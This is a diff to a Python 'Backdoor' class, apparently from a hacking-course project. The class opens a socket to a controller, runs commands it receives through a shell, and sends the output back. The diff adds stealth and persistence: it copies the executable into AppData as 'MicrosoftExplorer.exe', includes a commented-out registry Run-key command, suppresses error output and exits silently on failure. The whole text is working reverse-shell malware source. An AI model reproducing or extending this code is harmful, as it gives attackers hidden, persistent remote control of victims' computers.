@@ -1,10 +1,11 @@
-import socket, json, os
+import socket, json, os, sys, shutil
 import subprocess
 import base64
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
@@ -15,7 +16,8 @@ class Backdoor:
 
     def exec_sys_comm(self, cmd):
         try:
-            result = subprocess.check_output(cmd, shell=True)
+            DEVNULL = open(os.devnull, 'wb')
+            result = subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)
             result = str(result, 'utf-8')
             print(result)
             return result
@@ -26,6 +28,18 @@ class Backdoor:
         json_data = json.dumps(data)
         json_data = bytes(json_data, 'utf-8')
         self.connection.send(json_data)
+
+    def persistence(self):
+        location = os.environ["appdata"] + "\\MicrosoftExplorer.exe"
+        # location = "/home/fox/PythonHacking/backdoor_copied.py"
+        if not os.path.exists(location): # so that this executes only the first time
+            shutil.copyfile(sys.executable, location)
+            # shutil.copyfile(__file__, location)
+            # if you want python file copied instead of exe
+            # subprocess.call(
+            #     'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ/d "' + location + '"',
+            #     shell=True)
+            # command for persistence windows
 
     def reliable_receive(self):
         json_data = ""
@@ -81,7 +95,12 @@ class Backdoor:
             self.reliable_send(command_result)
 
         self.connection.close()
+        sys.exit()
 
 
-my_backdoor = Backdoor("127.0.0.1", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("127.0.0.1", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
+
